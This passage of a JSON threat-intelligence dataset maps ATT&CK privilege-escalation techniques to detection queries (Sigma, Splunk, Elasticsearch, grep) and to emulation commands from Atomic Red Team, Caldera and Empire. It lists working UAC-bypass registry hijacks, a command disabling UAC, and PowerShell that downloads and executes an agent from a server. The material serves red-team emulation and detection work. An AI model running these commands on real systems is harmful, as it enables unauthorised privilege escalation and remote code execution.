attack.execution\n    - attack.t1053\n    - car.2013-08-001\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image:\"schtasks.exe\" AND CommandLine.keyword:*\\\\/change*\\\\/TN*\\\\/RU*\\\\/RP*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Windows-10-scheduled-task-SandboxEscaper-0-day <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Windows 10 scheduled task SandboxEscaper 0-day\",\\n    \"description\": \"Detects Task Scheduler .job import arbitrary DACL write\\\\\\\\par\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.execution\",\\n      \"attack.t1053\",\\n      \"car.2013-08-001\"\\n    ],\\n    \"query\": \"(Image:\\\\\"schtasks.exe\\\\\" AND CommandLine.keyword:*\\\\\\\\/change*\\\\\\\\/TN*\\\\\\\\/RU*\\\\\\\\/RP*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image:\\\\\"schtasks.exe\\\\\" AND CommandLine.keyword:*\\\\\\\\/change*\\\\\\\\/TN*\\\\\\\\/RU*\\\\\\\\/RP*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Windows 10 scheduled task SandboxEscaper 0-day\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image:\"schtasks.exe\" AND CommandLine.keyword:*\\\\/change*\\\\/TN*\\\\/RU*\\\\/RP*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"schtasks.exe\" CommandLine=\"*/change*/TN*/RU*/RP*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"schtasks.exe\" CommandLine=\"*/change*/TN*/RU*/RP*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*schtasks\\\\.exe)(?=.*.*/change.*/TN.*/RU.*/RP.*))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "Priv Esc:", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "Priv Esc:", "Built-in Windows Command": "", "Cobalt Strike": "", "Description": "", "Metasploit": ""}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "getsystem", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "getsystem", "name": "Metasploit"}, {"source": "Threat Hunting Tables", "command": "bitsadmin.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "msbuild.exe *MSBuildShell.csproj", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/ms16-032", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/ms16-032", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/tater", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/tater", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/ms16-135", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/ms16-135", "name": "Empire Module Command"}], "command_list": ["getsystem", "getsystem", "bitsadmin.exe", "msbuild.exe *MSBuildShell.csproj", "powershell/privesc/ms16-032", "powershell/privesc/ms16-032", "powershell/privesc/tater", "powershell/privesc/tater", "powershell/privesc/ms16-135", "powershell/privesc/ms16-135"], "technique_id": "T1068", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1068", "Built-in Windows Command": "", "Cobalt Strike": "getsystem", "Description": "This technique tries a series of exploits to elevate to a SYSTEM level process (these are actual exploits, not trust abuses, so there's always the potential for bluescreening)", "Metasploit": "getsystem"}}, {"Threat Hunting Tables": {"mitre_attack": "T1068", "file_value": "", "file_path": "", "parent_process": "bitsadmin.exe", "itw_sample": "https://www.joesecurity.org/reports/report-1144eeaebb15044fa64f4d9bb5670349.html#startup", "chain_id": "100013", "registry_value": "", "mitre_caption": "file_transfer", "registry_path": "", "frequency": "low", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1068", "file_value": "", "file_path": "", "parent_process": "msbuild.exe", "itw_sample": "https://github.com/Cn33liz/MSBuildShell/blob/master/MSBuildShell.csproj", "chain_id": "100041", "registry_value": "", "mitre_caption": "vulnerability_exploit", "registry_path": "", "frequency": "rare", "commandline_string": "*MSBuildShell.csproj", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1068", "Empire Module": "powershell/privesc/ms16-032", "Technique": "Exploitation for Privilege Escalation", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/privesc/ms16-032\":  [\"T1068\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1068", "Empire Module": "powershell/privesc/tater", "Technique": "Exploitation for Privilege Escalation", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/privesc/tater\":  [\"T1068\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1068", "Empire Module": "powershell/privesc/ms16-135", "Technique": "Exploitation for Privilege Escalation", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/privesc/ms16-135\":  [\"T1068\"],"}}], "queries": [{"query": "title: Exploiting CVE-2019-1388\nid: 02e0b2ea-a597-428e-b04a-af6a1a403e5c\nstatus: experimental\ndescription: Detects an explotation attempt in which the UAC consent dialogue is used to invoke an Internet Explorer process running as LOCAL_SYSTEM\nreferences:\n    - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1388\n    - https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege\nauthor: Florian Roth\ndate: 2019/11/20\ntags:\n    - attack.privilege_escalation\n    - attack.t1068\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\consent.exe'\n        Image: '*\\iexplore.exe'\n        CommandLine: '* http*'\n    rights1:\n        IntegrityLevel: 'System'  # for Sysmon users\n    rights2: \n        User: 'NT AUTHORITY\\SYSTEM'  # for non-Sysmon users - English language settings\n    condition: selection and ( rights1 or rights2 )\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Exploiting CVE-2019-1388\nid: 02e0b2ea-a597-428e-b04a-af6a1a403e5c\nstatus: experimental\ndescription: Detects an explotation attempt in which the UAC consent dialogue is used to invoke an Internet Explorer process running as LOCAL_SYSTEM\nreferences:\n    - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1388\n    - https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege\nauthor: Florian Roth\ndate: 2019/11/20\ntags:\n    - attack.privilege_escalation\n    - attack.t1068\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\consent.exe'\n        Image: '*\\iexplore.exe'\n        CommandLine: '* http*'\n    rights1:\n        IntegrityLevel: 'System'  # for Sysmon users\n    rights2: \n        User: 'NT AUTHORITY\\SYSTEM'  # for non-Sysmon users - English language settings\n    condition: selection and ( rights1 or rights2 )\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((ParentImage.keyword:*\\\\\\\\consent.exe AND Image.keyword:*\\\\\\\\iexplore.exe AND CommandLine.keyword:*\\\\ http*) AND (IntegrityLevel:\"System\" OR User:\"NT\\\\ AUTHORITY\\\\\\\\SYSTEM\"))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Exploiting-CVE-2019-1388 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Exploiting CVE-2019-1388\",\\n    \"description\": \"Detects an explotation attempt in which the UAC consent dialogue is used to invoke an Internet Explorer process running as LOCAL_SYSTEM\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.t1068\"\\n    ],\\n    \"query\": \"((ParentImage.keyword:*\\\\\\\\\\\\\\\\consent.exe AND Image.keyword:*\\\\\\\\\\\\\\\\iexplore.exe AND CommandLine.keyword:*\\\\\\\\ http*) AND (IntegrityLevel:\\\\\"System\\\\\" OR User:\\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\SYSTEM\\\\\"))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((ParentImage.keyword:*\\\\\\\\\\\\\\\\consent.exe AND Image.keyword:*\\\\\\\\\\\\\\\\iexplore.exe AND CommandLine.keyword:*\\\\\\\\ http*) AND (IntegrityLevel:\\\\\"System\\\\\" OR User:\\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\SYSTEM\\\\\"))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Exploiting CVE-2019-1388\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((ParentImage.keyword:*\\\\\\\\consent.exe AND Image.keyword:*\\\\\\\\iexplore.exe AND CommandLine.keyword:* http*) AND (IntegrityLevel:\"System\" OR User:\"NT AUTHORITY\\\\\\\\SYSTEM\"))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((ParentImage=\"*\\\\\\\\consent.exe\" Image=\"*\\\\\\\\iexplore.exe\" CommandLine=\"* http*\") (IntegrityLevel=\"System\" OR User=\"NT AUTHORITY\\\\\\\\SYSTEM\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentImage=\"*\\\\\\\\consent.exe\" Image=\"*\\\\\\\\iexplore.exe\" CommandLine=\"* http*\" (IntegrityLevel=\"System\" OR User=\"NT AUTHORITY\\\\\\\\SYSTEM\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*.*\\\\consent\\\\.exe)(?=.*.*\\\\iexplore\\\\.exe)(?=.*.* http.*)))(?=.*(?:.*(?:.*System|.*NT AUTHORITY\\\\SYSTEM))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Windows Kernel and 3rd-party drivers exploits. Token stealing\nid: 8065b1b4-1778-4427-877f-6bf948b26d38\ndescription: Detection of child processes spawned with SYSTEM privileges by parents with non-SYSTEM privileges and Medium integrity level\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\ntags:\n    - attack.privilege_escalation\n    - attack.t1068\nstatus: experimental\nauthor: Teymur Kheirkhabarov (source), Daniil Yugoslavskiy (rule)\ndate: 2019/06/03\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentIntegrityLevel: Medium\n        IntegrityLevel: System\n        User: \"NT AUTHORITY\\\\SYSTEM\"\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\nenrichment:\n    - EN_0001_cache_sysmon_event_id_1_info                # http://bit.ly/314zc6x\n    - EN_0002_enrich_sysmon_event_id_1_with_parent_info   # http://bit.ly/2KmSC0l", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Windows Kernel and 3rd-party drivers exploits. Token stealing\nid: 8065b1b4-1778-4427-877f-6bf948b26d38\ndescription: Detection of child processes spawned with SYSTEM privileges by parents with non-SYSTEM privileges and Medium integrity level\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\ntags:\n    - attack.privilege_escalation\n    - attack.t1068\nstatus: experimental\nauthor: Teymur Kheirkhabarov (source), Daniil Yugoslavskiy (rule)\ndate: 2019/06/03\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentIntegrityLevel: Medium\n        IntegrityLevel: System\n        User: \"NT AUTHORITY\\\\SYSTEM\"\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\nenrichment:\n    - EN_0001_cache_sysmon_event_id_1_info                # http://bit.ly/314zc6x\n    - EN_0002_enrich_sysmon_event_id_1_with_parent_info   # http://bit.ly/2KmSC0l", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ParentIntegrityLevel:\"Medium\" AND IntegrityLevel:\"System\" AND User:\"NT\\\\ AUTHORITY\\\\\\\\SYSTEM\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Windows-Kernel-and-3rd-party-drivers-exploits.-Token-stealing <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Windows Kernel and 3rd-party drivers exploits. Token stealing\",\\n    \"description\": \"Detection of child processes spawned with SYSTEM privileges by parents with non-SYSTEM privileges and Medium integrity level\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.t1068\"\\n    ],\\n    \"query\": \"(ParentIntegrityLevel:\\\\\"Medium\\\\\" AND IntegrityLevel:\\\\\"System\\\\\" AND User:\\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\SYSTEM\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentIntegrityLevel:\\\\\"Medium\\\\\" AND IntegrityLevel:\\\\\"System\\\\\" AND User:\\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\SYSTEM\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Windows Kernel and 3rd-party drivers exploits. Token stealing\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ParentIntegrityLevel:\"Medium\" AND IntegrityLevel:\"System\" AND User:\"NT AUTHORITY\\\\\\\\SYSTEM\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(ParentIntegrityLevel=\"Medium\" IntegrityLevel=\"System\" User=\"NT AUTHORITY\\\\\\\\SYSTEM\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentIntegrityLevel=\"Medium\" IntegrityLevel=\"System\" User=\"NT AUTHORITY\\\\\\\\SYSTEM\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*Medium)(?=.*System)(?=.*NT AUTHORITY\\\\SYSTEM))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "uacbypass", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "One of the following:\nexploit/windows/local/bypassuac\nexploit/windows/local/bypassuac_injection\nexploit/windows/local/bypassuac_vbs", "name": "Metasploit"}, {"source": "atomics/T1088/T1088.yaml", "command": "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f\ncmd.exe /c eventvwr.msc\n", "name": null}, {"source": "atomics/T1088/T1088.yaml", "command": "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"\n", "name": null}, {"source": "atomics/T1088/T1088.yaml", "command": "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\"\nfodhelper.exe\n", "name": null}, {"source": "atomics/T1088/T1088.yaml", "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\"\n", "name": null}, {"source": "atomics/T1088/T1088.yaml", "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\nStart-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"\n", "name": null}, {"source": "atomics/T1088/T1088.yaml", "command": "mkdir \"\\\\?\\C:\\Windows \\System32\\\"\ncopy \"C:\\Windows\\System32\\cmd.exe\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\nmklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\n", "name": null}, {"source": "data/abilities/privilege-escalation/665432a4-42e7-4ee1-af19-a9a8c9455d0c.yml", "command": {"windows": {"psh": {"command": "New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force\n"}}}, "name": "Set a registry key to allow UAC bypass"}, {"source": "data/abilities/privilege-escalation/95ad5d69-563e-477b-802b-4855bfb3be09.yml", "command": {"windows": {"cmd,psh": {"command": ".\\Akagi64.exe 30 C:\\Windows\\System32\\cmd.exe\n", "payload": "Akagi64.exe"}}}, "name": "Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe"}, {"source": "data/abilities/privilege-escalation/b7344901-0b02-4ead-baf6-e3f629ed545f.yml", "command": {"windows": {"psh": {"command": ".\\Akagi64.exe 45 C:\\Windows\\System32\\cmd.exe\n", "payload": "Akagi64.exe"}}}, "name": "executes the slui exe file handler hijack"}, {"source": "data/abilities/privilege-escalation/e3db134c-4aed-4c5a-9607-c50183c9ef9e.yml", "command": {"windows": {"psh": {"command": "$url=\"#{server}/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\"); $wc.Headers.add(\"file\",\"sandcat.go\"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"); [io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n$job = Start-Job -ScriptBlock { Import-Module -Name .\\Bypass-UAC.ps1; Bypass-UAC -Command \"C:\\Users\\Public\\$name.exe -group #{group}\"; };\nReceive-Job -Job $job -Wait;\n", "payload": "Bypass-UAC.ps1"}}}, "name": "Bypass user account controls - medium"}, {"source": "data/abilities/privilege-escalation/e99cce5c-cb7e-4a6e-8a09-1609a221b90a.yml", "command": {"windows": {"psh": {"command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$wc.Headers.add(\"defaultSleep\",\"60\");\n$wc.Headers.add(\"defaultGroup\",\"bypassed_u_bro\");\n$data=$wc.DownloadData($url);\n$name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\");\n[io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n.\\Akagi64.exe 32 \"C:\\Users\\Public\\$name.exe -server #{server}\"\n", "payload": "Akagi64.exe"}}}, "name": "UIPI bypass with uiAccess application"}, {"source": "Threat Hunting Tables", "command": "eventvwr.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "HKEY_USERS\\*\\mscfile\\shell\\open\\command", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "eventvwr.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "mshta.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "verclsid.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "winword.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "verclsid.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "*.exe reg query", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths", "name": "registry_path"}, {"source": "SysmonHunter - UAC bypass", "command": "Software\\Classes\\mscfile\\shell\\open\\command|mscfile\\shell\\open\\command", "name": null}, {"source": "SysmonHunter - UAC bypass", "command": "Software\\Classes\\mscfile\\shell\\open\\command|mscfile\\shell\\open\\command", "name": null}, {"source": "SysmonHunter - UAC bypass", "command": "\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe|\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand", "name": null}, {"source": "SysmonHunter - UAC bypass", "command": "\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe|\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand", "name": null}, {"source": "SysmonHunter - UAC bypass", "command": "\\Software\\Classes\\ms-settings\\shell\\open\\command", "name": null}, {"source": "SysmonHunter - UAC bypass", "command": "\\Software\\Classes\\ms-settings\\shell\\open\\command", "name": null}, {"source": "SysmonHunter - UAC bypass", "command": "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\cmmgr32.exe", "name": null}, {"source": "SysmonHunter - UAC bypass", "command": "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\cmmgr32.exe", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/ask", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/ask", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac_eventvwr", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac_eventvwr", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac_wscript", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac_wscript", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac_env", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac_env", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac_fodhelper", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac_fodhelper", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac_sdctlbypass", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac_sdctlbypass", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac_tokenmanipulation", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/bypassuac_tokenmanipulation", "name": "Empire Module Command"}], "command_list": ["uacbypass", "One of the following:\nexploit/windows/local/bypassuac\nexploit/windows/local/bypassuac_injection\nexploit/windows/local/bypassuac_vbs", "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f\ncmd.exe /c eventvwr.msc\n", "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"\n", "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\"\nfodhelper.exe\n", "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty 